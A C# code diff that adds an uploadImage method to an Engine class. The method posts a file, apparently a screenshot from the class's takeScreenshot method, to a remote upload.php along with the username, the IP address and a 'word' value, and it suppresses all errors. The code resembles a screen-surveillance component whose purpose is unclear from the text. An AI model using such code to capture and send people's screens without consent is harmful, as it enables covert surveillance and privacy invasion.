@@ -6,6 +6,8 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.Net;
 using System.Net.Sockets;
+using System.Collections.Specialized;
+
 namespace engine
 {
     public class Engine
@@ -23,6 +25,7 @@ namespace engine
             throw new Exception("No network adapters with an IPv4 address in the system!");
         }
 
+      
         public static string takeScreenshot(int screenWidth, int screenHeight)
         {
             Bitmap memoryImage;
@@ -47,5 +50,29 @@ namespace engine
 
             return fileName;
         }
+
+        public static void uploadImage(string server_address, string path, string username, string ipaddr, string word)
+        {
+            try
+            {
+                WebClient client = new WebClient();
+                string myFile = path;
+                client.Credentials = CredentialCache.DefaultCredentials;
+
+                NameValueCollection parameters = new NameValueCollection();
+                parameters.Add("username", username);
+                parameters.Add("ipaddr", ipaddr);
+                parameters.Add("word", word);
+                client.QueryString = parameters;
+
+                client.UploadFile(@"http://" + server_address + "/upload.php", "POST", myFile);
+                client.Dispose();
+            }
+            catch (Exception err)
+            {
+               
+            }
+        }
     }
+
 }
